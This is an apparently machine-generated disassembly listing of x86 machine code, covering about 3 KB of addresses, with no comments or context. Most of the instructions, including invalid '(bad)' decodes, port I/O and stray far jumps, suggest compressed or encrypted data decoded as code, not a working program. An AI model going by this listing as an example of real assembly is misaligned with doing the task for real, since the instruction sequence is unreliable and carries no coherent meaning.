  421c7d:	in     eax,dx
  421c7e:	sub    edx,DWORD PTR [edx+0x2c]
  421c81:	sub    BYTE PTR [ebx],0x81
  421c84:	jl     0x421c3c
  421c86:	and    DWORD PTR [ecx],edx
  421c88:	mov    ds:0x3e044853,eax
  421c8d:	push   cs
  421c8e:	add    DWORD PTR [eax],ecx
  421c90:	mov    edi,ebx
  421c92:	and    ebp,ebx
  421c94:	aas    
  421c95:	mov    ch,0x53
  421c97:	cld    
  421c98:	ds int3 
  421c9a:	(bad)  
  421c9c:	into   
  421c9d:	xchg   BYTE PTR [edi+0x7],bl
  421ca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ca1:	cli    
  421ca2:	sbb    al,0x13
  421ca4:	dec    ecx
  421ca5:	dec    ecx
  421ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ca7:	cmp    eax,0xa5c956cd
  421cac:	shl    DWORD PTR [esi],cl
  421cae:	jle    0x421c7e
  421cb0:	jns    0x421c87
  421cb2:	dec    eax
  421cb3:	xchg   ecx,eax
  421cb4:	arpl   WORD PTR [ebx-0x70b97676],bx
  421cba:	retf   0x355e
  421cbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cbe:	retf   0xd8f
  421cc1:	mul    DWORD PTR [eax-0x2c647691]
  421cc7:	ficomp WORD PTR [ebx+ebp*8-0x68c36c0f]
  421cce:	adc    eax,0xace83f81
  421cd3:	les    ecx,FWORD PTR [ebp+0x71bcd4db]
  421cd9:	ja     0x421d08
  421cdb:	push   ebp
  421cdc:	in     eax,dx
  421cdd:	lods   eax,DWORD PTR ds:[esi]
  421cde:	retf   0x3583
  421ce1:	push   ecx
  421ce2:	add    BYTE PTR [esi],bh
  421ce4:	jge    0x421c9f
  421ce6:	cmp    DWORD PTR [esi-0x22],edi
  421ce9:	popa   
  421cea:	mov    ebx,0xdc2c8b3f
  421cef:	xchg   edx,eax
  421cf0:	cmp    DWORD PTR [esi-0x10],edx
  421cf3:	mov    edx,0x8a7f359c
  421cf8:	mov    BYTE PTR [ebx+0x60],al
  421cfb:	retf   
  421cfc:	int3   
  421cfd:	or     al,0x55
  421cff:	add    DWORD PTR [esi+esi*4-0x14],esp
  421d03:	sbb    BYTE PTR [esi],bh
  421d05:	push   es
  421d06:	dec    edx
  421d07:	xchg   ecx,eax
  421d08:	mov    cl,0xfe
  421d0a:	jae    0x421d0d
  421d0c:	dec    esi
  421d0d:	or     BYTE PTR [edx-0x59],ch
  421d10:	maxps  xmm3,XMMWORD PTR [esi+0x1a]
  421d14:	adc    al,0x7e
  421d16:	in     eax,0xdf
  421d18:	gs jl  0x421d67
  421d1b:	mov    bh,0xe9
  421d1d:	push   0xffffffeb
  421d1f:	cmp    edx,DWORD PTR [eax-0x14]
  421d22:	loop   0x421d6f
  421d24:	jl     0x421d5e
  421d26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d27:	or     DWORD PTR [esi],esi
  421d29:	mov    bh,0x7
  421d2b:	ins    BYTE PTR es:[edi],dx
  421d2c:	mov    bl,0x21
  421d2e:	mov    dl,BYTE PTR [eax]
  421d30:	sbb    eax,0x473c7125
  421d35:	xchg   ebx,eax
  421d36:	in     al,0xcb
  421d38:	cmp    DWORD PTR [edx-0x6628bd49],edx
  421d3e:	push   ebx
  421d3f:	adc    DWORD PTR cs:[ebx],edi
  421d42:	addr16 push esi
  421d44:	xchg   esp,eax
  421d45:	rol    BYTE PTR [ecx+ebx*2],1
  421d48:	jg     0x421d01
  421d4a:	inc    ebp
  421d4b:	rcr    DWORD PTR [edi+0x70],cl
  421d4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d4f:	and    eax,0xf30ee2b9
  421d54:	jmp    0x7e76:0xe8c4b424
  421d5b:	sbb    al,BYTE PTR [ebp-0x348cb37a]
  421d61:	or     edi,edi
  421d63:	int    0x15
  421d65:	add    al,0xa2
  421d67:	test   al,0x8a
  421d69:	push   edi
  421d6a:	xchg   ebp,eax
  421d6b:	or     al,0x0
  421d6d:	sub    bh,BYTE PTR ds:0x5f6f84ef
  421d73:	icebp  
  421d74:	sub    eax,0xca17644c
  421d79:	fcomp  st(7)
  421d7b:	arpl   dx,ax
  421d7d:	push   esp
  421d7e:	jno    0x421db5
  421d80:	mov    bl,0x79
  421d83:	aas    
  421d84:	xchg   ebx,eax
  421d85:	retf   
  421d86:	dec    ebp
  421d87:	aad    0x77
  421d89:	test   al,0xa7
  421d8b:	cdq    
  421d8c:	outs   dx,DWORD PTR ds:[esi]
  421d8d:	and    eax,0xcfc6c102
  421d92:	stos   BYTE PTR es:[edi],al
  421d93:	sbb    DWORD PTR [ecx],esi
  421d95:	je     0x421df5
  421d97:	imul   ebx,DWORD PTR [ecx-0x1b8e45c],0xb2495fab
  421da1:	test   eax,0x12104aed
  421da6:	retf   0x9a83
  421da9:	xor    dh,al
  421dab:	icebp  
  421dac:	stos   DWORD PTR es:[edi],eax
  421dad:	cli    
  421dae:	sbb    DWORD PTR [edi],edi
  421db0:	or     eax,0x15041fae
  421db5:	mov    ecx,0xc6f88564
  421dba:	push   ecx
  421dbb:	ja     0x421d6a
  421dbd:	fist   DWORD PTR [bx]
  421dc0:	pop    ebx
  421dc1:	mov    ch,0xab
  421dc3:	mov    ah,0x21
  421dc5:	push   esp
  421dc6:	sbb    eax,0x67dea7f1
  421dcb:	dec    ebp
  421dcc:	shr    DWORD PTR [esi+0x6795d5f4],cl
  421dd2:	push   es
  421dd3:	int3   
  421dd4:	jg     0x421e29
  421dd6:	(bad)  
  421dd7:	in     eax,dx
  421dd8:	mov    bh,0xa5
  421dda:	push   cs
  421ddb:	mov    ebp,0xbe3c428
  421de0:	shl    edi,1
  421de2:	pop    cx
  421de4:	xchg   ebp,eax
  421de5:	add    esp,edi
  421de7:	enter  0x1ee5,0xee
  421deb:	test   ch,al
  421ded:	das    
  421dee:	mov    DWORD PTR [ebp-0x5296ca83],ebp
  421df4:	retf   0xfb6e
  421df7:	cmp    al,0xc9
  421df9:	imul   ebp,DWORD PTR [edx+ecx*2],0x6a
  421dfd:	call   0x8cd5:0x4a3cced4
  421e04:	mov    bl,0x3
  421e06:	out    0x9e,eax
  421e08:	mov    BYTE PTR ds:0x84141891,ch
  421e0e:	ret    
  421e0f:	mov    ds:0xadb9e56,al
  421e14:	ds test eax,0xef72b96a
  421e1a:	sub    al,0x6e
  421e1c:	add    bh,BYTE PTR [edi-0x597ae940]
  421e22:	sub    al,ah
  421e24:	nop
  421e25:	out    dx,al
  421e26:	ret    0x2e33
  421e29:	and    DWORD PTR [ebx+esi*1],edx
  421e2c:	push   edi
  421e2d:	std    
  421e2e:	out    0x97,eax
  421e30:	mov    bl,0xb6
  421e32:	bnd jb 0x421e39
  421e35:	pusha  
  421e36:	call   0x4cba3b5
  421e3b:	push   ebp
  421e3c:	fwait
  421e3d:	xchg   ebx,eax
  421e3e:	jmp    0xf7843f52
  421e43:	outs   dx,DWORD PTR ds:[esi]
  421e44:	(bad)  
  421e45:	xchg   ecx,eax
  421e46:	xchg   ebp,eax
  421e47:	sbb    BYTE PTR [ecx+0x6e],0x50
  421e4b:	mov    bh,bl
  421e4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e4e:	xchg   edx,eax
  421e4f:	sbb    eax,0xe3d8b7e1
  421e54:	sub    DWORD PTR [edi-0x77c574ea],edi
  421e5a:	pop    esp
  421e5b:	stc    
  421e5c:	mov    BYTE PTR [edi],bl
  421e5e:	out    dx,al
  421e5f:	mov    bh,0x34
  421e61:	xor    esp,edx
  421e63:	mov    ebp,fs
  421e65:	mov    DWORD PTR [ebp+0x27776e4c],ebp
  421e6b:	xchg   ecx,eax
  421e6c:	cmp    BYTE PTR [ebx],cl
  421e6e:	clc    
  421e6f:	cmp    edi,DWORD PTR [ebx-0xcf29c7c]
  421e75:	xchg   esi,eax
  421e76:	arpl   WORD PTR [edx+eax*8],si
  421e79:	or     DWORD PTR [edx],ebx
  421e7b:	inc    edi
  421e7c:	js     0x421e64
  421e7e:	push   ecx
  421e7f:	pusha  
  421e80:	add    dh,bh
  421e82:	pop    esi
  421e83:	shl    esp,cl
  421e85:	aaa    
  421e86:	inc    esi
  421e87:	sbb    al,0x69
  421e89:	fld    DWORD PTR [ecx]
  421e8b:	aad    0xb6
  421e8d:	scas   eax,DWORD PTR es:[edi]
  421e8e:	mov    fs,WORD PTR [ebp-0x711f71f2]
  421e94:	jle    0x421e61
  421e96:	mov    al,ds:0xf4887d37
  421e9b:	mov    al,ds:0x15f1ca1
  421ea0:	push   ebp
  421ea1:	xor    eax,0xd6c38186
  421ea6:	inc    ebx
  421ea7:	and    bl,BYTE PTR [edx-0x56334fcb]
  421ead:	pop    edx
  421eae:	adc    DWORD PTR [edx+ebp*4+0x2517da23],0xe9426df1
  421eb9:	adc    dh,BYTE PTR [edx+eiz*1-0x3b]
  421ebd:	ror    BYTE PTR [ebx-0x41],1
  421ec0:	and    BYTE PTR [bp+0x45],bh
  421ec4:	int3   
  421ec5:	pop    esi
  421ec6:	int    0xc4
  421ec8:	jp     0x421ed3
  421eca:	pop    ebp
  421ecb:	ins    BYTE PTR es:[edi],dx
  421ecc:	push   eax
  421ecd:	sbb    ch,ch
  421ecf:	xor    ah,BYTE PTR [eax-0x5e728829]
  421ed5:	popf   
  421ed6:	scas   eax,DWORD PTR es:[edi]
  421ed7:	push   ss
  421ed8:	(bad)  
  421ed9:	out    0xe4,al
  421edb:	pop    edx
  421edc:	adc    BYTE PTR [ecx-0x52],ch
  421edf:	(bad)  [esi-0x80]
  421ee2:	retf   
  421ee3:	call   FWORD PTR [ebp+0xb]
  421ee6:	inc    edi
  421ee7:	iret   
  421ee8:	ror    BYTE PTR [esi+edi*1+0x20acbf3b],0x12
  421ef0:	cld    
  421ef1:	jne    0x421f50
  421ef3:	lods   al,BYTE PTR ss:[esi]
  421ef5:	call   FWORD PTR [edx]
  421ef7:	(bad)
  421efa:	scas   al,BYTE PTR es:[edi]
  421efb:	(bad)  [ecx+0x1e4325a8]
  421f01:	xor    BYTE PTR [edx],dl
  421f03:	mov    esp,0x36f82003
  421f08:	xchg   esi,eax
  421f09:	pop    ebp
  421f0a:	in     al,dx
  421f0b:	push   ss
  421f0c:	xor    ch,BYTE PTR [ebx+0x56]
  421f0f:	fst    DWORD PTR [esi-0x16]
  421f12:	sahf   
  421f13:	sar    DWORD PTR [edi-0x43],cl
  421f16:	retf   
  421f17:	cmp    dh,BYTE PTR [ebp-0x34]
  421f1a:	mov    edx,0xc1e882b0
  421f1f:	call   edi
  421f21:	clc    
  421f22:	jecxz  0x421efc
  421f24:	stos   BYTE PTR es:[edi],al
  421f25:	xchg   esp,eax
  421f26:	outs   dx,DWORD PTR ds:[esi]
  421f27:	sub    cl,BYTE PTR [ebx]
  421f29:	lods   eax,DWORD PTR ds:[esi]
  421f2a:	repnz scas eax,DWORD PTR es:[edi]
  421f2c:	push   ecx
  421f2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f2e:	mov    bh,0x3d
  421f30:	sbb    bh,bl
  421f32:	add    al,0xb3
  421f34:	jmp    0x421eda
  421f36:	repnz adc DWORD PTR [edx+0x56f9b2ed],0xf58f7f66
  421f41:	or     DWORD PTR [ecx-0x1b],ecx
  421f44:	popa   
  421f45:	mov    ds:0x2eb8c40,eax
  421f4a:	pop    eax
  421f4b:	addr16 jle 0x421fa0
  421f4e:	inc    eax
  421f4f:	ja     0x421fb1
  421f51:	push   cs
  421f52:	call   0x7742:0x4facca9a
  421f59:	in     al,0x19
  421f5b:	in     al,dx
  421f5c:	jno    0x421f41
  421f5e:	and    DWORD PTR [edi-0x44],0xe5afcf57
  421f65:	cld    
  421f66:	les    esp,FWORD PTR [ebx]
  421f68:	shl    al,cl
  421f6a:	nop
  421f6b:	std    
  421f6c:	mov    ch,0xea
  421f6e:	and    eax,0xe0ffe340
  421f73:	(bad)  
  421f74:	mov    ds:0xac4388e5,eax
  421f79:	and    dh,0x23
  421f7c:	or     ebx,DWORD PTR [ebx-0x20cdc073]
  421f82:	sub    edi,DWORD PTR [ecx-0x430f8ec]
  421f88:	neg    DWORD PTR [ebp+eiz*2+0x127024d0]
  421f8f:	mov    DWORD PTR [ecx+ecx*2+0x57c40327],ebp
  421f96:	sub    al,0x9e
  421f98:	xor    BYTE PTR [esi+0x2d],ch
  421f9b:	in     al,0x93
  421f9d:	cmp    al,0x51
  421f9f:	adc    eax,0x80cf5bc8
  421fa4:	popf   
  421fa5:	into   
  421fa6:	out    dx,al
  421fa7:	mov    bl,0x11
  421fa9:	fld    QWORD PTR [esi+0x652732d3]
  421faf:	xchg   BYTE PTR [esi+0x78],dh
  421fb2:	pusha  
  421fb3:	push   esp
  421fb4:	push   ds
  421fb5:	stos   BYTE PTR es:[edi],al
  421fb6:	daa    
  421fb7:	adc    ebp,DWORD PTR [edx]
  421fb9:	pusha  
  421fba:	lea    ebx,[eax+0x1e]
  421fbd:	and    BYTE PTR [esi-0x4],bh
  421fc0:	sbb    cl,ah
  421fc2:	leave  
  421fc3:	and    DWORD PTR [ebx],esi
  421fc5:	fbstp  TBYTE PTR [eax+0x468247d3]
  421fcb:	dec    eax
  421fcc:	shr    esi,0xc5
  421fcf:	pop    esi
  421fd0:	sbb    al,0x11
  421fd2:	aam    0x54
  421fd4:	xor    dl,BYTE PTR [ebx+0x2e]
  421fd7:	mov    fs,WORD PTR [esi]
  421fd9:	add    ebp,DWORD PTR [edi+0x5d]
  421fdc:	(bad)  
  421fdd:	cmp    eax,0x67bbd7a8
  421fe2:	push   ss
  421fe3:	sbb    edx,0x6d33731b
  421fe9:	jmp    ebx
  421feb:	repz or dl,BYTE PTR [edx-0x5a]
  421fef:	mov    ecx,edx
  421ff1:	mov    eax,0x2dd2f113
  421ff6:	cwde   
  421ff7:	pop    ss
  421ff8:	xchg   ebp,eax
  421ff9:	lea    esp,[edi-0x14]
  421ffc:	xchg   DWORD PTR [ecx-0x6858fbe3],ebp
  422002:	ret    
  422003:	push   ecx
  422004:	pop    ss
  422005:	dec    ebx
  422006:	bound  edi,QWORD PTR [edx+0x26]
  422009:	cdq    
  42200a:	nop
  42200b:	push   ebp
  42200c:	sbb    BYTE PTR [esi+0x23],0xb4
  422010:	xor    eax,0xa167d14
  422015:	inc    esi
  422016:	cdq    
  422017:	mov    eax,0xf4b647ef
  42201c:	xchg   DWORD PTR [eax+0x6e483cb2],ebp
  422022:	bound  ebx,QWORD PTR [edi+edi*2]
  422025:	xchg   esp,esp
  422027:	cmp    esi,DWORD PTR [edi+0x31]
  42202a:	add    BYTE PTR [ecx+ebx*1-0x16],al
  42202e:	enter  0xca35,0x7d
  422032:	retf   
  422033:	repz pusha 
  422035:	mov    bl,dh
  422037:	out    0x4e,al
  422039:	push   eax
  42203a:	xchg   esi,eax
  42203b:	pop    ebp
  42203c:	xchg   BYTE PTR [edi],dh
  42203e:	adc    DWORD PTR [edi],eax
  422040:	mov    esi,esp
  422042:	push   edx
  422043:	dec    ecx
  422044:	cmp    eax,DWORD PTR [ecx]
  422046:	dec    edx
  422047:	out    0xad,al
  422049:	inc    ebp
  42204a:	clc    
  42204b:	arpl   cx,bp
  42204d:	pop    ebp
  42204e:	fst    DWORD PTR [edx]
  422050:	or     DWORD PTR [edi-0x64a086b2],0x77
  422057:	mov    ds:0xe0c451be,al
  42205c:	mov    ecx,0xfa8012a7
  422061:	out    0x7e,eax
  422063:	clc    
  422064:	add    BYTE PTR [eax+0x21],dh
  422067:	adc    ch,bh
  422069:	scas   al,BYTE PTR es:[edi]
  42206a:	push   0x91271d26
  42206f:	or     al,bl
  422071:	sti    
  422072:	rcr    BYTE PTR ds:0x4b1d970a,1
  422078:	jno    0x422083
  42207a:	cmp    eax,0xb5f2e1c0
  42207f:	aad    0x77
  422081:	add    BYTE PTR [esi-0x4eb8f432],ah
  422087:	je     0x4220c8
  422089:	test   dh,dh
  42208b:	add    ebx,DWORD PTR ds:0x352847e8
  422091:	stos   DWORD PTR es:[edi],eax
  422092:	adc    eax,0x622fd489
  422097:	jnp    0x4220ec
  422099:	sub    eax,esp
  42209b:	cmp    al,0xd5
  42209e:	adc    BYTE PTR [edx],0x2e
  4220a1:	sbb    al,0x61
  4220a3:	add    DWORD PTR [esi],eax
  4220a5:	rol    BYTE PTR [ebp-0x131e4a1b],cl
  4220ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220ac:	les    edi,FWORD PTR [edx]
  4220ae:	mov    ch,0xe2
  4220b0:	push   ds
  4220b1:	mov    bl,0x7c
  4220b3:	jge    0x4220ab
  4220b5:	mov    cs,WORD PTR ds:0x553d17
  4220bb:	bound  eax,QWORD PTR [ebx+0x20]
  4220be:	dec    ecx
  4220bf:	shl    DWORD PTR [ecx+0x42],0x31
  4220c3:	mov    dl,0x1b
  4220c5:	xchg   ebx,eax
  4220c6:	icebp  
  4220c7:	mov    al,0x7b
  4220c9:	sbb    eax,0x6f1f4135
  4220ce:	ins    DWORD PTR es:[edi],dx
  4220cf:	cmp    DWORD PTR [edx+0x3a],ecx
  4220d2:	dec    ecx
  4220d3:	fadd   QWORD PTR [ebp-0x1c9fc277]
  4220d9:	out    dx,eax
  4220da:	sbb    DWORD PTR [ebx-0x1a76c8c2],ecx
  4220e0:	repz cld 
  4220e2:	cmp    BYTE PTR [ebx+0x37330705],ah
  4220e8:	push   ss
  4220e9:	or     al,BYTE PTR [ebp+0x28262471]
  4220ef:	nop
  4220f0:	lahf   
  4220f1:	push   0x21394b5f
  4220f6:	das    
  4220f7:	cld    
  4220f8:	loop   0x422176
  4220fa:	cdq    
  4220fb:	lea    eax,[edi]
  4220fd:	adc    edi,DWORD PTR [ebx+0x74c874f1]
  422103:	pop    esp
  422104:	xor    al,0xf6
  422106:	mov    ebx,0x6d7d78ac
  42210b:	adc    al,0xbf
  42210d:	in     al,dx
  42210e:	outs   dx,DWORD PTR ds:[esi]
  42210f:	pop    ebp
  422110:	aas    
  422111:	pop    ds
  422112:	(bad)  
  422113:	push   0xfffffff7
  422115:	push   ecx
  422116:	or     BYTE PTR [ebx+0x69],bh
  422119:	push   esi
  42211a:	iret   
  42211b:	sbb    DWORD PTR [ebx],esi
  42211d:	cdq    
  42211e:	jecxz  0x422148
  422120:	ret    
  422121:	ror    BYTE PTR [di+0x5685],0xcc
  422127:	adc    eax,DWORD PTR [eax-0x253423c3]
  42212d:	jg     0x422125
  42212f:	mov    ds:0x10abf6dc,eax
  422134:	jbe    0x422171
  422136:	lahf   
  422137:	les    ecx,FWORD PTR [eax+0x37]
  42213a:	iret   
  42213b:	inc    esp
  42213c:	push   edx
  42213d:	jmp    0x422155
  42213f:	icebp  
  422140:	sbb    DWORD PTR [esi+0x7b],ecx
  422143:	mov    al,ds:0x9dcc1a47
  422148:	cmp    BYTE PTR [bx+si],dh
  42214b:	(bad)  
  42214c:	jmp    0x99a91bf
  422151:	push   esp
  422152:	ja     0x42213c
  422154:	aad    0xcf
  422156:	add    ebp,DWORD PTR [edi]
  422158:	(bad)  
  422159:	ds nop esi
  42215d:	dec    ebx
  42215e:	sbb    eax,0xd70e3726
  422163:	mov    dh,0x5d
  422165:	aad    0x39
  422167:	jns    0x4221ac
  422169:	jnp    0x422137
  42216b:	dec    esp
  42216c:	mov    esp,0x21793f1a
  422171:	loop   0x4221b9
  422173:	xchg   ebp,eax
  422174:	(bad)  
  422175:	mov    ebx,0x2b62c962
  42217a:	jmp    0xe74b:0xb28ff85c
  422181:	(bad)  
  422182:	stc    
  422183:	mov    eax,0xdbeb79f1
  422188:	int3   
  422189:	ins    BYTE PTR es:[edi],dx
  42218a:	or     al,0x22
  42218c:	jge    0x422205
  42218e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42218f:	shr    BYTE PTR [ebx-0x2a63a84b],0x75
  422196:	xchg   edx,eax
  422197:	lea    edi,[edi-0x4d]
  42219a:	add    eax,0xee3c5ee8
  42219f:	not    BYTE PTR [eax-0x2c]
  4221a2:	mov    ah,0x41
  4221a4:	nop
  4221a5:	cmp    dh,BYTE PTR [edi-0x22c0b15c]
  4221ab:	mov    esi,ds
  4221ad:	add    eax,esi
  4221af:	pop    edx
  4221b0:	and    eax,0x5d58887f
  4221b5:	test   eax,0x3030e017
  4221ba:	arpl   bx,bx
  4221bc:	push   esp
  4221bd:	pop    es
  4221be:	mov    ah,0xbb
  4221c0:	pop    ebx
  4221c2:	les    ecx,FWORD PTR [ebx]
  4221c4:	in     eax,0x6e
  4221c6:	jne    0x422190
  4221c8:	adc    dh,dl
  4221ca:	lahf   
  4221cb:	cwde   
  4221cc:	dec    ebx
  4221cd:	test   bl,ch
  4221cf:	call   esp
  4221d1:	dec    edx
  4221d2:	and    cl,BYTE PTR [eax+eax*1-0x53abd2b7]
  4221d9:	mov    edi,0xab0f8104
  4221de:	cmp    dh,BYTE PTR [ebp+0x1a]
  4221e1:	push   ecx
  4221e2:	jbe    0x422263
  4221e4:	add    DWORD PTR [edi+esi*2-0x1a35264b],edx
  4221eb:	inc    edx
  4221ec:	das    
  4221ed:	jno    0x422216
  4221ef:	int    0x7d
  4221f1:	enter  0xc1d8,0x75
  4221f5:	cld    
  4221f6:	dec    eax
  4221f7:	inc    edx
  4221f8:	cli    
  4221f9:	inc    edi
  4221fa:	outs   dx,BYTE PTR ds:[esi]
  4221fb:	ffree  st(1)
  4221fd:	mov    esp,0xd84f3a82
  422202:	stos   BYTE PTR es:[edi],al
  422203:	mov    cs,WORD PTR [edi+0x10ef460b]
  422209:	add    BYTE PTR [ebx],dl
  42220b:	sti    
  42220c:	mov    ah,0x5c
  42220e:	stos   DWORD PTR es:[edi],eax
  42220f:	mov    esi,0x82f32954
  422214:	jnp    0x42223f
  422216:	cdq    
  422217:	fnstsw WORD PTR ds:0x3ab8077d
  42221d:	mov    al,0x5d
  42221f:	test   DWORD PTR [esi-0xd],ebp
  422222:	pop    eax
  422223:	mov    BYTE PTR [ecx+0x691cb606],bh
  422229:	xchg   ecx,eax
  42222a:	cwde   
  42222b:	sub    esp,edi
  42222d:	jle    0x422267
  42222f:	mov    esi,0x51bedd9e
  422234:	outs   dx,BYTE PTR ds:[esi]
  422235:	xchg   ecx,eax
  422236:	dec    esi
  422237:	mov    cl,0x5a
  422239:	fwait
  42223a:	jne    0x422274
  42223c:	mov    ebp,0x23b636b6
  422241:	(bad)
  422244:	and    dh,0xd0
  422247:	mov    dh,0xdd
  422249:	push   ecx
  42224a:	jae    0x4222c1
  42224c:	loope  0x42225b
  42224e:	sbb    al,0xae
  422250:	repnz shl DWORD PTR [ebx+0x1d177b15],0x84
  422258:	lds    ecx,FWORD PTR [edi-0x54]
  42225b:	scas   eax,DWORD PTR es:[edi]
  42225c:	xor    al,0x3d
  42225e:	fs xchg ebx,eax
  422260:	pop    ebp
  422261:	call   0xe23d75a4
  422266:	lea    ebp,[ebp-0x1b]
  422269:	mov    eax,0xb84316b8
  42226e:	mov    WORD PTR [edx],cs
  422270:	pop    esi
  422272:	fsubrp st(7),st
  422274:	xchg   BYTE PTR [esi+eax*2+0x259c6f05],dl
  42227b:	cli    
  42227c:	add    dh,al
  42227e:	pop    ecx
  42227f:	mov    WORD PTR [eax],?
  422281:	jne    0x42224a
  422283:	out    0x64,eax
  422285:	out    0x6d,al
  422287:	popf   
  422288:	mov    ch,0x5b
  42228a:	mov    eax,0x94dec080
  42228f:	add    BYTE PTR [edi+0x3e784cc8],bh
  422295:	es mov ah,0x70
  422298:	pop    edi
  422299:	fxch   st(7)
  42229b:	jo     0x42224e
  42229d:	xchg   ecx,eax
  42229e:	mov    edx,0xfde19eb4
  4222a3:	mov    edx,DWORD PTR ds:0x3b6f566
  4222a9:	cmp    al,0x7a
  4222ab:	add    eax,0x70763fc9
  4222b0:	sbb    esp,0x63
  4222b3:	sbb    edx,DWORD PTR [ebx]
  4222b5:	xchg   BYTE PTR [esi+0x3c6336cf],dl
  4222bb:	ds push 0x85f94cbe
  4222c1:	jo     0x422342
  4222c3:	jb     0x422276
  4222c5:	adc    BYTE PTR [ebx-0x69],dl
  4222c8:	fnstenv [eax-0x21fb6cf]
  4222ce:	xor    dl,ah
  4222d0:	or     dh,ah
  4222d2:	xchg   edi,eax
  4222d3:	je     0x42232e
  4222d5:	ficom  DWORD PTR [ecx+eax*2]
  4222d8:	and    eax,0x93bf6673
  4222dd:	xor    bh,dh
  4222df:	cdq    
  4222e0:	fisub  WORD PTR [edx]
  4222e2:	xchg   edi,eax
  4222e3:	repz cli 
  4222e5:	lock inc ecx
  4222e7:	and    ebp,DWORD PTR [ebx+0x6f]
  4222ea:	std    
  4222eb:	add    al,0x29
  4222ed:	fild   QWORD PTR [ebp+0x26e46159]
  4222f3:	cmp    ch,ah
  4222f5:	pop    ss
  4222f6:	lods   al,BYTE PTR ds:[esi]
  4222f7:	fdiv   st,st(7)
  4222f9:	jnp    0x4222c4
  4222fb:	xchg   ecx,eax
  4222fc:	jo     0x42235f
  4222fe:	pop    ebx
  4222ff:	inc    esp
  422300:	or     eax,0x167d8288
  422305:	jns    0x422301
  422307:	and    eax,0x11da9dc5
  42230c:	fbld   TBYTE PTR [edx-0x6b057850]
  422312:	out    dx,al
  422313:	jo     0x422390
  422315:	sub    al,0x59
  422317:	push   0x13
  422319:	cmc    
  42231a:	add    eax,0x1bf92994
  42231f:	pop    es
  422320:	repnz ins DWORD PTR es:[edi],dx
  422322:	es (bad) 
  422324:	push   cs
  422325:	ss gs push eax
  422328:	dec    eax
  422329:	lods   al,BYTE PTR ds:[esi]
  42232a:	push   es
  42232b:	pop    eax
  42232c:	mov    ah,0x1d
  42232e:	dec    edi
  42232f:	pusha  
  422330:	jno    0x42237c
  422332:	ins    BYTE PTR es:[edi],dx
  422333:	int3   
  422334:	repz xchg edx,eax
  422336:	daa    
  422337:	pop    edx
  422338:	pop    edx
  422339:	push   esp
  42233a:	in     al,0x95
  42233c:	dec    eax
  42233d:	(bad)  
  42233e:	dec    edi
  42233f:	cmp    ah,BYTE PTR [ebp-0x6d]
  422342:	mov    ebx,0x107f1813
  422347:	or     eax,0x20424620
  42234c:	je     0x422368
  42234e:	mul    DWORD PTR [edx+0xb2fb521]
  422354:	add    eax,0x51027865
  42235a:	mov    ds:0xd9e61841,eax
  42235f:	les    ebx,FWORD PTR [ebp+0x55]
  422362:	push   0x18
  422364:	mov    eax,ds:0xb21a522
  422369:	and    DWORD PTR [edi],edi
  42236b:	arpl   WORD PTR [esp+esi*2+0x5f3a8ade],ax
  422372:	mov    DWORD PTR [ecx],edx
  422374:	icebp  
  422375:	arpl   WORD PTR [esi],ax
  422377:	daa    
  422378:	popa   
  422379:	sbb    ah,BYTE PTR [eax]
  42237b:	out    0x90,eax
  42237d:	mov    bl,0x1a
  42237f:	(bad)  
  422381:	and    eax,0x88af28ca
  422386:	adc    esi,ecx
  422388:	sahf   
  422389:	add    eax,esp
  42238b:	cmp    DWORD PTR [ecx],0x1a
  42238e:	hlt    
  42238f:	cmp    ch,bh
  422391:	jnp    0x4223d1
  422393:	sbb    DWORD PTR ds:0xb3dbb9e4,esi
  422399:	xor    DWORD PTR [esi-0x6b],ecx
  42239c:	jae    0x422320
  42239e:	push   eax
  42239f:	add    al,ch
  4223a1:	sbb    ebx,DWORD PTR [esi-0x4]
  4223a4:	repnz sub BYTE PTR [si],ah
  4223a8:	fisubr DWORD PTR [ecx+0x4a]
  4223ab:	adc    bh,ah
  4223ad:	push   es
  4223ae:	inc    esp
  4223af:	and    eax,0xe99fd6a7
  4223b4:	inc    ecx
  4223b5:	mov    ebp,0x5e25a18
  4223ba:	pusha  
  4223bb:	jnp    0x42239d
  4223bd:	cwde   
  4223be:	leave  
  4223bf:	sbb    dh,bh
  4223c1:	out    0xed,eax
  4223c3:	jbe    0x42237f
  4223c5:	sahf   
  4223c6:	icebp  
  4223c7:	scas   al,BYTE PTR es:[edi]
  4223c8:	jns    0x4223a6
  4223ca:	push   ebp
  4223cb:	cmp    eax,0xf7d8371a
  4223d0:	ret    0xbec9
  4223d3:	xchg   edx,eax
  4223d4:	and    BYTE PTR [ecx-0x1d],dh
  4223d7:	xchg   BYTE PTR ds:0x88c3dafc,ah
  4223dd:	mov    ah,0x72
  4223df:	sub    cl,BYTE PTR [ebx]
  4223e1:	xor    ah,BYTE PTR [edx-0xa459528]
  4223e7:	bsr    esi,esp
  4223ea:	and    dl,BYTE PTR [edx-0x80]
  4223ed:	ja     0x4223b7
  4223ef:	ret    0x386b
  4223f2:	(bad)  
  4223f3:	lds    esp,FWORD PTR [ebx-0x2e]
  4223f6:	es jmp 0x422458
  4223f9:	out    dx,eax
  4223fa:	pushfw 
  4223fc:	lods   eax,DWORD PTR ds:[esi]
  4223fd:	loopne 0x4223ba
  4223ff:	mov    ecx,0x554438d5
  422404:	add    al,0x25
  422406:	neg    DWORD PTR [edi-0x7f7ee59a]
  42240c:	fadd   DWORD PTR [edx]
  42240e:	inc    eax
  42240f:	cs inc esi
  422411:	mov    al,0xda
  422413:	aas    
  422414:	add    DWORD PTR [ebx+0x25f20856],edx
  42241a:	xor    BYTE PTR [ecx],ch
  42241c:	dec    ebp
  42241d:	je     0x42241a
  42241f:	pop    ss
  422420:	mov    esi,ds
  422422:	pop    ebx
  422423:	les    esp,FWORD PTR [ebp+0x18]
  422426:	js     0x4223e2
  422428:	jmp    0x47b4:0x99ab2790
  42242f:	and    DWORD PTR [esi-0x8548e82],0xffffffaa
  422436:	loop   0x422402
  422438:	push   ds
  422439:	inc    edi
  42243a:	loope  0x422492
  42243c:	mov    edi,ebx
  42243e:	fstp   TBYTE PTR [edi]
  422440:	aaa    
